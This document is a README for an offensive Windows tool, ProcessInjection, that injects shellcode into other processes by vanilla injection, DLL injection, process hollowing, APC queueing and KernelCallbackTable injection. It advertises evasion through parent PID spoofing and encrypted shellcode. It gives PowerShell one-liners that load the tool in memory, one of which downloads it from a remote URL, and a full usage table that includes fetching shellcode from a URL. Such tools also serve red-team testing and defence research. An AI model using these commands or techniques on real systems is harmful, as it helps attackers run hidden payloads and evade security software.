# ProcessInjection

----

The program is designed to perform process injection.
Currently the tool supports 5 process injection techniques.

```
1) Vanilla Process Injection
2) DLL Injection
3) Process Hollowing
4) APC Queue
5) KernelCallbackTable Injection
```

The tool accepts shellcode in 4 formats.

```
1) base64
2) hex
3) c
4) raw
```

The tool supports 4 methods to perform process injection.

```
1) P/Invoke
2) D/Invoke
3) Direct Syscalls
4) Indirect Syscalls
```

Supports 3 detection evading techniques.

```
1) Parent PID Spoofing

Encryption
2) XOR Encryption (It can also be used with Parent PID Spoofing technique but can't be used with DLL Injection Technique)
3) AES Encryption (It can also be used with Parent PID Spoofing technique but can't be used with DLL Injection Technique)
```

Can be loaded via reflection.

```
# Load from the disk
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("ProcessInjection.exe"));

# Load from a remote server
[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("http://<URL>/ProcessInjection.exe"))

# Perform process injection
[ProcessInjection.ProcessInjection]::Main(@("/t:1", "/f:base64", "/pid:<ProcessId>", "/sc:<ShellCode>"))
```

### Command Line Usage

```
Usage           Description
-----           -----------
/t              Specify the process injection technique id.
                1 = Vanilla Process Injection
                2 = DLL Injection
                3 = Process Hollowing
                4 = APC Queue Injection
				5 = KernelCallbackTable Injection
/m              Specify the method to be used
                p = P/Invoke (Default)
                d = D/Invoke
		ds = Direct Syscalls
		ids = Indirect Syscalls
/f              Specify the format of the shellcode.
                base64
                hex
                c
                raw
/pid            Specify the process id.
/parentproc     Specify the parent process name.
/path           Specify the path of the file that contains the shellcode.
/ppath          Specify the path of the executable that will be spawned (Mandatory while using /parentproc argument).
/url            Specify the url where the shellcode is hosted.
/enc            Specify the encryption type (aes or xor) in which the shellcode is encrypted.
/key            Specify the key that will be used to decrypt the shellcode.
/sc             Specify the shellcode directly in base64 or hex format. Note: To pass large shellcode please leverage reflection to run the program.  
/help           Show help
```

### Blog Post

[https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html](https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html)

[https://3xpl01tc0d3r.blogspot.com/2019/09/process-injection-part-ii.html](https://3xpl01tc0d3r.blogspot.com/2019/09/process-injection-part-ii.html)

[https://3xpl01tc0d3r.blogspot.com/2019/10/process-injection-part-iii.html](https://3xpl01tc0d3r.blogspot.com/2019/10/process-injection-part-iii.html)

[https://medium.com/@r3n_hat/parent-pid-spoofing-b0b17317168e](https://medium.com/@r3n_hat/parent-pid-spoofing-b0b17317168e)

[https://3xpl01tc0d3r.blogspot.com/2019/12/process-injection-part-v.html](https://3xpl01tc0d3r.blogspot.com/2019/12/process-injection-part-v.html)

[https://3xpl01tc0d3r.blogspot.com/2020/08/process-injection-tool-updates.html](https://3xpl01tc0d3r.blogspot.com/2020/08/process-injection-tool-updates.html)


### Contribution Credit

[Renos](https://twitter.com/r3n_hat)

Credits also goes to :

[Aaron Bray](https://github.com/ambray) & [Rasta Mouse](https://twitter.com/_rastamouse) for Process Hollowing code

[The Wover](https://twitter.com/TheRealWover) & [b33f](https://twitter.com/FuzzySec) for Dynamic Invoke - (https://thewover.github.io/Dynamic-Invoke/)
